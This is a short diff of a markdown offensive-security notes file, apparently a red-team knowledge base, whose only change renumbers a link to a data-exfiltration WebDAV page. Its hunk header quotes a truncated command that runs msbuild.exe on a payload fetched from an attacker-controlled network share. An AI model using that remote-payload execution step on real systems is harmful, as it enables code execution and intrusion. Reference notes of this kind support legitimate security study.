@@ -29,7 +29,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\payloa
 
 - [[HTA]]
 
-- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Linux/Network Ports/WebDAV|File Transfer and Data Exfiltration: Linux WebDAV Server]]
+- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Linux/Network Ports/WebDAV|File Transfer and Data Exfiltration: Linux WebDAV Server]]
 
 ### DMCXBlue
 
